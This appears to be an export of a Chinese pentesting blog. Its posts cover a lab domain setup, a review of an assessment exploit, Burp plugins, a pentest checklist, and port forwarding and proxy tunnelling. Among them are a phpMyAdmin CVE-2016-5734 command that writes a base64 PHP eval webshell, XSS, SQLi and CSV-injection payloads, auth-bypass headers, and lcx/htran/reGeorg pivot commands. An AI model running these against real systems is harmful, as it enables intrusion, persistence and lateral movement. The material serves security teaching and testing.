<h3 id="5-Win-Server-2003-R2"><a href="#5-Win-Server-2003-R2" class="headerlink" title="5. Win Server 2003 R2"></a>5. Win Server 2003 R2</h3><p>配置参考 win7，添加到域中即可。</p>
<p>最后，查看域内主机：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> view /domain</span><br><span class="line">GOD</span><br><span class="line"><span class="built_in">net</span> view /domain:GOD</span><br><span class="line">主机名</span><br></pre></td></tr></table></figure>

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/构建内网环境/image-20210926220726524.png" alt="image-20210926220726524" style="zoom: 67%;" />

]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>某次攻防考核复盘</title>
    <url>/posts/af133799.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是针对某人的某次攻防考核的<strong>复盘</strong>进行复盘，然后从中找到自己不足的地方，试想一下如果考核对象是你自己，你会如何做？你怎么才能做的更好、更高效。因为知识面有限，所以肯定会有很多不足之处，恳请指正。</p>
<p>考核复盘文章：</p>
<p><a href="https://forum.butian.net/share/1494">https://forum.butian.net/share/1494</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="原作者的选择："><a href="#原作者的选择：" class="headerlink" title="原作者的选择："></a>原作者的选择：</h3><p>他是使用了 fscan 和 nmap 结合来扫，虽然说 fscan 的效果也算是可以的，但是 fscan 的 poc 数量远远比不过 GobyPoc，比如 phpmyadmin、泛微OA之类的漏洞，这些都是可以通过平时自己积累的Goby的poc库快速检测出来的。</p>
<p>所以也就导致了他不能快速定位到关键系统。</p>
<h3 id="我的选择："><a href="#我的选择：" class="headerlink" title="我的选择："></a>我的选择：</h3><p>根据给出的目标网段，可以使用 Goby 快速扫描，而如果靶机是在虚拟机里的话，在 Goby 里面选择正确的网卡，再进行扫描即可，找到网卡对应的序列号也很简单：</p>
<p>（1）运行regedit<br>（2）浏览到： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces<br>（3）Interfaces下有多个子项，每个子项对应一个网卡，用ip来确定那个项对应那个网卡。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E9%92%88%E5%AF%B9%E5%88%AB%E4%BA%BA%E7%9A%84%E6%9F%90%E6%AC%A1%E6%94%BB%E9%98%B2%E8%80%83%E6%A0%B8%E5%A4%8D%E7%9B%98/image-20220506232515112.png" alt="image-20220506232515112"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E9%92%88%E5%AF%B9%E5%88%AB%E4%BA%BA%E7%9A%84%E6%9F%90%E6%AC%A1%E6%94%BB%E9%98%B2%E8%80%83%E6%A0%B8%E5%A4%8D%E7%9B%98/image-20220506232223867.png" alt="image-20220506232223867"></p>
<p>使用 Goby 同时进行资产扫描和漏洞扫描的效果也是非常的好的。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-phpmyadmin远程代码执行"><a href="#1-phpmyadmin远程代码执行" class="headerlink" title="1. phpmyadmin远程代码执行"></a>1. phpmyadmin远程代码执行</h3><p>首先通过弱口令 root&#x2F;root 登录成功，然后根据版本号确定对应的漏洞CVE-2016-5734，</p>
<p>EXP地址：<a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p>
<p>执行命令：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python exp.py -u root --pwd=<span class="string">&quot;root&quot;</span> http:<span class="comment">//10.255.200.23:8080 -c &quot;system(&#x27;whoami&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>写入webshell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python exp.py -u root --pwd=<span class="string">&quot;root&quot;</span> http:<span class="comment">//10.255.200.23:8080 -c &quot;file\_put\_contents(&#x27;shell.php&#x27;,base64\_decode(&#x27;PD9waHAgZXZhbCgkX1JFUVVFU1RbbWRybWRyXSk7Pz4=&#x27;));&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我已掌握的技能：</p>
<p>我所需要掌握的技能：</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite 插件</title>
    <url>/posts/bdea44af.html</url>
    <content><![CDATA[<h1 id="如何武装你的BurpSuite（一）"><a href="#如何武装你的BurpSuite（一）" class="headerlink" title="如何武装你的BurpSuite（一）"></a>如何武装你的BurpSuite（一）</h1><h2 id="一、FastjsonScan-——-FastjsonRCE检测工具"><a href="#一、FastjsonScan-——-FastjsonRCE检测工具" class="headerlink" title="一、FastjsonScan —— FastjsonRCE检测工具"></a>一、FastjsonScan <strong>—— FastjsonRCE检测工具</strong></h2><p><strong>github地址</strong>：<a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a><br>一个简单的Fastjson反序列化检测burp插件,能够在渗透测试时快速提高效率。<br>该工具实战可以看我之前的一篇文章，<a href="http://www.0dayhack.net/index.php/82/">记一次fastjsonRCE实战</a>。</p>
<h2 id="二、Struts2-RCE-——-Struts2RCE检测工具"><a href="#二、Struts2-RCE-——-Struts2RCE检测工具" class="headerlink" title="二、Struts2-RCE —— Struts2RCE检测工具"></a>二、<strong>Struts2-RCE</strong> <strong>—— Struts2RCE检测工具</strong></h2><p>用于检查struts2 RCE漏洞的Burp扩展插件<br><strong>github地址</strong>：<a href="https://github.com/prakharathreya/Struts2-RCE">https://github.com/prakharathreya/Struts2-RCE</a></p>
<p>目前支持漏洞（<strong>S2-001、S2-007、S2-008、S2-012、S2-013、S2-014、S2-015、S2-016、S2-019、S2-029、S2-032、S2-033、S2-037、S2-045、S2-048、S2-053、S2-057、S2-DevMode</strong>）</p>
<h2 id="三、ShiroPoc-——-Shiro回显利用工具"><a href="#三、ShiroPoc-——-Shiro回显利用工具" class="headerlink" title="三、ShiroPoc —— Shiro回显利用工具"></a>三、ShiroPoc <strong>—— Shiro回显利用工具</strong></h2><p>并不是<strong>很推荐这个工具</strong>，对于Shiro反序列化的利用，目前个人认为<strong>Xray</strong>高级版中<strong>未开源的独家反序列化利用链</strong>才是最完美的,其次是<strong>飞鸿师傅</strong>的<strong>ShiroExploit图形化工具</strong>。</p>
<p><strong>github地址</strong>:<a href="https://github.com/potats0/shiroPoc">https://github.com/potats0/shiroPoc</a></p>
<h2 id="四、Autorize-——-越权自动化测试工具"><a href="#四、Autorize-——-越权自动化测试工具" class="headerlink" title="四、Autorize —— 越权自动化测试工具"></a>四、<strong>Autorize —— 越权自动化测试工具</strong></h2><p><strong>Autorize</strong> 是一个<strong>测试权限问题的插件</strong>，可以在插件中设置一个<strong>低权限账号的 cookie</strong> ，然后使用高权限的账号去浏览所有功能，<strong>Autorize</strong> 会自动用低权限账号的 <strong>cookie 重放请求</strong>，同时也会发一个<strong>不带 cookie</strong> 的请求来测试是否可以在<strong>未登录状态下访问</strong>。<br>该插件可以直接在<strong>Bapp Store</strong> 安装。</p>
<h2 id="五、Chunked-coding-converter-——-分块传输插件（注入时绕WAF有奇效）"><a href="#五、Chunked-coding-converter-——-分块传输插件（注入时绕WAF有奇效）" class="headerlink" title="五、Chunked coding converter —— 分块传输插件（注入时绕WAF有奇效）"></a>五、Chunked coding converter <strong>—— 分块传输插件（注入时绕WAF有奇效）</strong></h2><p><strong>github地址</strong>：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
<p><strong>Chunk分块传输方法</strong>是一种有效的<strong>绕过WAF</strong>的Web攻击手段。其原理是利用<code>Transfer-Encoding: chunked</code>这个HTTP请求头，当<strong>HTTP请求中含有这个请求头</strong>时，则传输的数据全部可进行<strong>分块编码。</strong></p>
<p><strong>分块传输原理可以查看下面师傅的文章</strong>（<strong>十分详细</strong>）</p>
<ul>
<li><a href="https://www.cnblogs.com/renhaoblog/p/13395539.html">利用分块传输绕WAF</a></li>
<li><a href="https://mp.weixin.qq.com/s/pM1ULCqNdQwSB7hcltrbtw">唯快不破的分块传输绕WAF</a></li>
<li><a href="https://www.freebuf.com/sectool/193659.html">技术讨论 | 在HTTP协议层面绕过WAF</a></li>
</ul>
<h2 id="六、Sqlmap4Burp-——-BurpSuite与Sqlmap联动插件（极力推荐）"><a href="#六、Sqlmap4Burp-——-BurpSuite与Sqlmap联动插件（极力推荐）" class="headerlink" title="六、Sqlmap4Burp++ **—— BurpSuite与Sqlmap联动插件（极力推荐） **"></a>六、Sqlmap4Burp++ **—— BurpSuite与Sqlmap联动插件（极力推荐） **</h2><p><strong>github地址</strong>：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus/">https://github.com/c0ny1/sqlmap4burp-plus-plus/</a><br><strong>sqlmap4burp++<strong>是一款兼容Windows，mac，linux多个系统平台的</strong>Burpsuite与sqlmap联动插件</strong>。</p>
<p>配置好<strong>Python</strong>与<strong>Sqlmap的路径和参数</strong>点击<strong>OK</strong>，会自动利用<strong>Sqlmap跑这个POST包</strong>，再也不用<strong>Copy到文件中</strong>，然后再打开<strong>Sqlmap</strong>跑了！！</p>
<h2 id="十、Content-Type-Converter-——-快速互相转换XML到JSON"><a href="#十、Content-Type-Converter-——-快速互相转换XML到JSON" class="headerlink" title="十、Content Type Converter —— 快速互相转换XML到JSON"></a>十、Content Type Converter <strong>——</strong> 快速互相转换XML到JSON</h2><p>此插件可以在<strong>BurpSuite自带的软件商城</strong>下载到。</p>
<p>该插件可以快速互相<strong>转换XML到JSON</strong>，或许很多同学会觉得没有用，但<strong>笔者以前看到过一篇文章</strong>，是一篇对于<strong>企业SRC</strong>挖掘的，正常环境之中，<strong>POST包没有任何问题</strong>，但<strong>将数据包转换为JSON</strong>时出现了<strong>FastjsonRCE</strong>，就是这一个<strong>细节</strong>，拿下了一个<strong>高危</strong>的漏洞，所以说有时尝试一下未免不是一件坏事，而且又是<strong>利用插件</strong>，<strong>方便又快捷</strong>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.0dayhack.net/index.php/817/">http://www.0dayhack.net/index.php/817/</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试CheckList</title>
    <url>/posts/a63d5570.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写一个渗透测试CheckList，梳理以下自己的渗透体系，加深自己的印象，避免渗透过程中出现遗漏。</p>
<p>建立自己的知识体系，会让渗透测试事半功倍。</p>
<p>配合这个<a href="https://fstraw.cn/posts/3bae2a35.html">渗透测试水漏洞清单</a>一起使用更好</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="通用漏洞"><a href="#通用漏洞" class="headerlink" title="通用漏洞"></a>通用漏洞</h3><p>dom型xss：</p>
<p>凡是可以控制的变量，都要注意是否回显到html中，有时候回显了但打开源码才能看到。</p>
<p>为什么单独说domxss，是因为xray高级版扫描器只能扫反射型xss和存储型xss。这是容易忽视的点。</p>
<p>csrf：</p>
<p>凡是进行操作的点，没看到token的点都得测，post&#x2F;get 方式互换，也是我较为忽略的点。</p>
<p>sqli：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">*</span><br><span class="line">%</span><br><span class="line"># 宽字节</span><br><span class="line">%df%27%df%22</span><br><span class="line">1&#x27; or sleep(10) </span><br><span class="line">编码</span><br></pre></td></tr></table></figure>

<p>ssrf：</p>
<p>凡是能够对外发起网络请求的地方，多注意url中是否有调用外部资源的请求，包含其他url</p>
<p>url跳转：</p>
<p>这种是较为常见的，反正url中附带url的、有returnurl、redirect等关键词的都可能存在。</p>
<h3 id="后台登录-x2F-注册"><a href="#后台登录-x2F-注册" class="headerlink" title="后台登录&#x2F;注册"></a>后台登录&#x2F;注册</h3><ol>
<li>弱口令&#x2F;万能密码</li>
<li>用户名&#x2F;密码爆破</li>
</ol>
<p>如果密码为明文传输：设置一个超长的密码，爆破用户名，通过响应时间确定存在的用户名。<br>3. 密码置为空<br>3. Sql 注入<br>4. 未授权登录后台&#x2F;登录后台绕过</p>
<p>修改 X-Forward-For 的值等，403Bypasser等插件</p>
<p>如：直接访问&#x2F;admin目录302跳转，使用&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;绕过目录权限限制</p>
<ol start="6">
<li><p>验证绕过</p>
</li>
<li><p>手机登录验证码</p>
</li>
</ol>
<p>爆破、凭证返回、验证绕过、空验证码、删除验证码参数、短信轰炸、<strong>session覆盖(可以尝试)</strong></p>
<p>参考：<a href="https://fstraw.cn/posts/4abdabd1.html#1-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4">https://fstraw.cn/posts/4abdabd1.html#1-%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4</a></p>
<ol start="8">
<li>在登录接口，fuzzing 登录请求包参数：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;$fuzzparm$=True</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>突破 sso 登录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header头添加：</span><br><span class="line">    Authorization: JWT 1</span><br><span class="line">    ticket: 1</span><br><span class="line">    token: 1</span><br><span class="line">Cookie添加：</span><br><span class="line">	Authorization: JWT 1; ticket: 1; token: 1;</span><br><span class="line">	还有 userId=1; admin=1; user等</span><br></pre></td></tr></table></figure>



<ol start="8">
<li><strong>外网系统点击链接后访问内网IP</strong></li>
</ol>
<p>点击登录功能会指向127.0.0.1:8080&#x2F;axis2&#x2F;，通过burp中proxy-&gt;options-&gt;Matchand Peplace模块设置规则后，将127.0.0.1:8080转化为目标外网ip，成功登录。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/渗透测试CheckList/image-20220808170140651.png" alt="image-20220808170140651" style="zoom:50%;" />



<ol start="9">
<li><strong>登录系统时ip地址禁止访问</strong></li>
</ol>
<p>某些站点访问时显示“禁止外部ip访问”、“登录ip不是白名单ip”等。</p>
<p>可以使用burp插件绕过，伪造ip为127.0.0.1、0.0.0.0之类的ip进行绕过。</p>
<p>“<a href="https://github.com/swagkarna/Burp-FakeIp&quot;">https://github.com/swagkarna/Burp-FakeIp&quot;</a></p>
<ol start="10">
<li>Web登录认证类漏洞总结</li>
</ol>
<p><a href="https://mp.weixin.qq.com/s/_0aQYV_4Tz9knQgzs7WSvw">https://mp.weixin.qq.com/s/_0aQYV_4Tz9knQgzs7WSvw</a></p>
<ol start="11">
<li>JWT认证攻击</li>
</ol>
<p><a href="https://mp.weixin.qq.com/s/kfB0ovlafuAcoI5yEEkDEQ">https://mp.weixin.qq.com/s/kfB0ovlafuAcoI5yEEkDEQ</a></p>
<p>利用工具：</p>
<p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
<p><a href="https://jwt.io/">https://jwt.io/</a></p>
<h3 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h3><ol>
<li><strong>水平&#x2F;逻辑 越权</strong></li>
</ol>
<p>参考:<a href="https://fstraw.cn/posts/4abdabd1.html#6-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83">https://fstraw.cn/posts/4abdabd1.html#6-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83</a></p>
<p>订单、收货地址、资料修改(能x则x)</p>
<p><strong>添加用户</strong>：普通用户可能不存在这个功能，管理员有，但普通用户只要知道添加用户的请求包，一样可以实现这个功能。</p>
<p><strong>双写请求包的参数</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/image-20220808165550290.png" alt="image-20220808165550290"></p>
<ol start="2">
<li><strong>后台日志处记录登录ip</strong></li>
</ol>
<p><a href="https://mp.weixin.qq.com/s/lFMPZyF3QYyWpWHA7l7JAw">https://mp.weixin.qq.com/s/lFMPZyF3QYyWpWHA7l7JAw</a></p>
<p>可能会从 X-Forwarded-For 取值，这时候如果没有防火墙的话，可以轻易注入xss或者sql payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &lt;script&gt;console.log(‘xss’)&lt;/script&gt;</span><br><span class="line">X-Forwarded-For: &quot;&gt;&lt;h1&gt;abc&lt;/h1&gt;</span><br><span class="line">X-Forwarded-For: t&lt;/td&gt;&lt;h1&gt;abc&lt;/h1&gt;&lt;</span><br></pre></td></tr></table></figure>

<p>注意，不可轻易注入xss弹窗 payload。</p>
<ol start="3">
<li><strong>导出csv文件处注入</strong></li>
</ol>
<p>有些日志记录了 X-Forwarded-For,也就是登录ip，然后又有导出功能，可以尝试注入 csv payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: =1+cmd|&#x27;/C calc&#x27;!A0</span><br><span class="line">X-Forwarded-For: %0A-3+3+cmd|&#x27;/C calc&#x27;!D2</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>任意文件读取</li>
</ol>
<p>找 <a href="http://xxxx.com/view?path=xxx.jpg">http://xxxx.com/view?path=xxx.jpg</a> 这样的url</p>
<p>不行就试试 <a href="http://xxxx.com/view?path=file://">http://xxxx.com/view?path=file://</a> 这种ssrf</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol start="0">
<li>绕过cdn查找真实ip几个网站就够了</li>
</ol>
<p><a href="https://search.censys.io/">https://search.censys.io/</a></p>
<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p>
<p>新的查找cdn的tips</p>
<p><a href="https://mp.weixin.qq.com/s/XG_IcJ-owSBnrJ3c5oqMxg%EF%BC%88nice%EF%BC%89">https://mp.weixin.qq.com/s/XG_IcJ-owSBnrJ3c5oqMxg（nice）</a></p>
<ol>
<li>目录扫描</li>
</ol>
<p>扫路径、敏感文件、</p>
<p><strong>动态备份文件名:</strong></p>
<p>经过实战检验，大部分都为域名.zip,而且备份文件可能不止一个</p>
<p>推荐项目：</p>
<p><a href="https://github.com/VMsec/ihoneyBakFileScan_Modify">https://github.com/VMsec/ihoneyBakFileScan_Modify</a> (500线程最好)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.zip</span><br><span class="line">web.zip</span><br><span class="line">域名.zip						# www.baidu.com.zip</span><br><span class="line">主域名.zip					   # baidu.zip</span><br><span class="line">主域名.顶级域名.zip			# baidu.com.zip</span><br><span class="line">子域名.tar.gz				   # api.baidu.com.tar.gz</span><br></pre></td></tr></table></figure>



<ol start="2">
<li>子域名收集</li>
</ol>
<p>phpinfo.me</p>
<p>Oneforall	</p>
<ol start="3">
<li>js 扫描</li>
</ol>
<p>普通站点：jsfinder</p>
<p>webpack打包站点：PackerFuzzer</p>
<ol start="4">
<li>第三方搜集敏感信息</li>
</ol>
<p>Github搜源码、云盘源码、淘宝&#x2F;闲鱼、</p>
<ol start="5">
<li>F12</li>
</ol>
<p>随便看看html源码、js源码这些有没有用户名或者密码。</p>
<ol start="6">
<li>端口扫描</li>
</ol>
<p>Goby、nmap</p>
<ol start="7">
<li>指纹识别</li>
</ol>
<p>网站用了什么框架，cms</p>
<ol start="8">
<li>fofa 根据特征收集类似站点</li>
</ol>
<p>当密码爆破不成功，可以通过获取其他站点的源代码，审计找出漏洞，再应用到目标站点。</p>
<ol start="9">
<li>api接口</li>
</ol>
<h3 id="邮箱系统"><a href="#邮箱系统" class="headerlink" title="邮箱系统"></a>邮箱系统</h3><ol>
<li>spf 邮箱任意伪造</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -type=txt qq.com</span><br></pre></td></tr></table></figure>



<h3 id="冷门漏洞"><a href="#冷门漏洞" class="headerlink" title="冷门漏洞"></a>冷门漏洞</h3><ol>
<li>Host 注入</li>
</ol>
<p>burp 拓展：Param Miner</p>
<ol start="2">
<li>Host 碰撞</li>
</ol>
<p>目标使用 Nginx 代理</p>
<p><a href="https://fstraw.cn/posts/1684ca85.html">https://fstraw.cn/posts/1684ca85.html</a></p>
<ol start="3">
<li>域传送漏洞</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsenum b.com</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全知识</title>
    <url>/posts/ea111a38.html</url>
    <content><![CDATA[<h1 id="一、web-蜜罐技术原理"><a href="#一、web-蜜罐技术原理" class="headerlink" title="一、web 蜜罐技术原理"></a>一、web 蜜罐技术原理</h1><p>利用 jsonp 捕获黑客社交网络信息</p>
<p>同源策略以及绕过：</p>
<p><a href="https://blog.csdn.net/duzm200542901104/article/details/85870019">https://blog.csdn.net/duzm200542901104/article/details/85870019</a></p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>端口转发、映射与代理的了解与常用工具的推荐</title>
    <url>/posts/fe24ba37.html</url>
    <content><![CDATA[<blockquote>
<p>编者荐语：推荐使用 <strong>Earthworm代理</strong> 内网流量</p>
<p>转载自：<a href="https://mp.weixin.qq.com/s/gZ0FviyWiqqh7l3ZiDTrSw">https://mp.weixin.qq.com/s/gZ0FviyWiqqh7l3ZiDTrSw</a></p>
</blockquote>
<h2 id="01-概述"><a href="#01-概述" class="headerlink" title="01 概述"></a>01 概述</h2><p>   在渗透测试中，当我们拿下web主机的shell权限后，通常无法直接访问到内网主机的端口，这个时候我们就需要用到代理与转发。端口转发（Port forwarding），有时候被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络节点到另一个网络节点的一个行为，使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p>
<h2 id="02-转发、映射详细解释"><a href="#02-转发、映射详细解释" class="headerlink" title="02 转发、映射详细解释"></a>02 转发、映射详细解释</h2><p>端口映射：端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。通俗来讲，映射端口，就是将一个内网端口映射到公网上的某个端口，假设我自己的电脑是在内网中，没有公网IP，但是我想提供一个端口供其他人使用，这就是端口映射。</p>
<h3 id="端口映射与转发的区别："><a href="#端口映射与转发的区别：" class="headerlink" title="端口映射与转发的区别："></a><strong>端口映射与转发的区别：</strong></h3><ol>
<li><p>概念不同：内网代理，与端口转发端口映射概念完全不同。</p>
</li>
<li><p>功能不完全一样：端口映射是将外网的一个端口完全映射给内网一个地址的指定端口，而端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口。3. 单双向通信：通信端口映射可以实现外网到内网和内网到外网通信双向，而端口转发只能实现外网到内网的单向通信</p>
</li>
</ol>
<h3 id="常见的端口映射方法："><a href="#常见的端口映射方法：" class="headerlink" title="常见的端口映射方法："></a><strong>常见的端口映射方法：</strong></h3><p>内网开启一个端口，边缘机用工具把内网开启的端口映射到本机的某个空闲端口，攻击机访问边缘机的映射端口就可以访问内网的机器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：Lcx.exe -tran 7777 10.10.10.10 80  </span><br><span class="line">//在肉鸡上执行以上代码，把内网的80端口转发给肉鸡的7777端口</span><br><span class="line">//攻击机直接访问肉鸡的7777端口，即可通信内网主机10.10.10.10 的80端口</span><br></pre></td></tr></table></figure>



<h3 id="端口转发的方法："><a href="#端口转发的方法：" class="headerlink" title="端口转发的方法："></a><strong>端口转发的方法：</strong></h3><p>1、先在攻击机执行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 9898 8888</span><br><span class="line">//监听本机9898端口并把数据发送给8888端口</span><br></pre></td></tr></table></figure>

<p>2、在肉鸡（边界机）上执行一下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 攻击机ip 9898 内网ip 内网端口（80）</span><br><span class="line">//把内网的80端口转发给攻击机的9898端口</span><br></pre></td></tr></table></figure>

<h2 id="03-端口转发常用的软件推荐"><a href="#03-端口转发常用的软件推荐" class="headerlink" title="03 端口转发常用的软件推荐"></a>03 端口转发常用的软件推荐</h2><p>除了上面示例的LCX外，还有以下工具也能完成相同功能。</p>
<p><strong>Htran</strong>：主要在windows下使用。</p>
<p>第一个应用场景：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机：htran.exe (-p) -Listen 9999 8888</span><br><span class="line">边缘机：htran.exe (-p) -Slave 攻击机_ip 9999 内网IP 3389</span><br><span class="line">在攻击机上执行:mstsc /v:127.0.0.1:8888</span><br></pre></td></tr></table></figure>

<p>第二应用场景：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">边界机执行，其ip是111.111.120.100：HTran2.4.exe -p -tran 7788 10.10.10.18 3389        </span><br><span class="line">攻击端直接连接肉鸡的7788端口：mstsc /v:111.111.120.100:7788</span><br></pre></td></tr></table></figure>

<p><strong>Earthworm</strong>：既有windows版也有linux版，比较常用，除了做端口转发与映射，还能建立代理。</p>
<p><strong>其他方法：</strong></p>
<p>SSH转发</p>
<p>Netsh：是windows自带的工具，可以帮我们建立端口映射</p>
<p>Socat转发</p>
<p>Iptables转发</p>
<p>相关操作可以自行百度，基本原理都一样，这里就不过多阐述了</p>
<h2 id="04-代理详细解释"><a href="#04-代理详细解释" class="headerlink" title="04 代理详细解释"></a>04 代理详细解释</h2><h3 id="什么是代理："><a href="#什么是代理：" class="headerlink" title="什么是代理："></a><strong>什么是代理：</strong></h3><p>代理（英语：Proxy），也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击</p>
<h3 id="代理的类别："><a href="#代理的类别：" class="headerlink" title="代理的类别："></a><strong>代理的类别：</strong></h3><p>HTTP代理</p>
<p>SOCKS代理</p>
<p>FTP代理</p>
<p>Telnet代理</p>
<p>SSL代理</p>
<h3 id="关于代理可用分为正向代理和反向代理："><a href="#关于代理可用分为正向代理和反向代理：" class="headerlink" title="关于代理可用分为正向代理和反向代理："></a><strong>关于代理可用分为正向代理和反向代理：</strong></h3><p>正向代理：客户端主动向代理发送一个请求，然后代理向服务器请求并将获取的内容返回给客户端。LhostàProxyàRhost。</p>
<p>反向代理：和正向代理相反，一般情况下是代理服务器主动将获取到的资源流量转发给客户端，让客户端接收。客户端只向代理服务器发送普通请求，该请求到哪里去，代理服务器自己判断，最后返回的数据递交给用户。Lhost<proxy>firewall&gt;Rhost</p>
<h2 id="05-代理工具的使用"><a href="#05-代理工具的使用" class="headerlink" title="05 代理工具的使用"></a>05 代理工具的使用</h2><h3 id="reGeorg："><a href="#reGeorg：" class="headerlink" title="reGeorg："></a>reGeorg：</h3><p>第一步：找到边缘服务器网站环境的开发语言对应的tunnel文件，如目标是apache环境，就把tunnel.nosocket.php文件丢到网站目录下。</p>
<p>第二步：在攻击机执行以下代码：开启4488端口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -u &quot;http://目标IP/tunnel.nosocket.php&quot; -p 4488</span><br></pre></td></tr></table></figure>

<p>第三步：设置代理：使用本地的应用程序：浏览器，socksCap(win)、proxychains（linux）等（注意：这些应用程序可以设置代理）然后通过代理，访问4488端口，就能连接内网机器。</p>
<h3 id="nps："><a href="#nps：" class="headerlink" title="nps："></a><strong>nps：</strong></h3><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器，几乎支持所有协议，支持内网http代理、内网socks5代理、p2p等。简洁但功能强大的WEB管理界面，支持服务端、客户端同时控制，扩展功能强大，全平台兼容，一键注册为服务。NPS分为客户端和服务器端，一般情况下，服务器放在攻击机，客户端放在目标机上！</p>
<p>下载地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p>
<p>使用文档：<a href="https://ehang-io.github.io/nps/#">https://ehang-io.github.io/nps/#</a> </p>
<p>第一步：启动nps</p>
<p>攻击机访问nps_server目录，输入.&#x2F;nps start。</p>
<p>启动nps，第一次使用，会提示有哪些命令可以使用，start，stop，install，uninstall等如果不安装nps服务器，直接启用nps start会报错。</p>
<p>安装后，即可正常开启nps服务端。</p>
<p>开启后，会开启多个端口，默认的后台端口是8080，直接浏览器访问localhost:8080即可访问</p>
<p>第二步：</p>
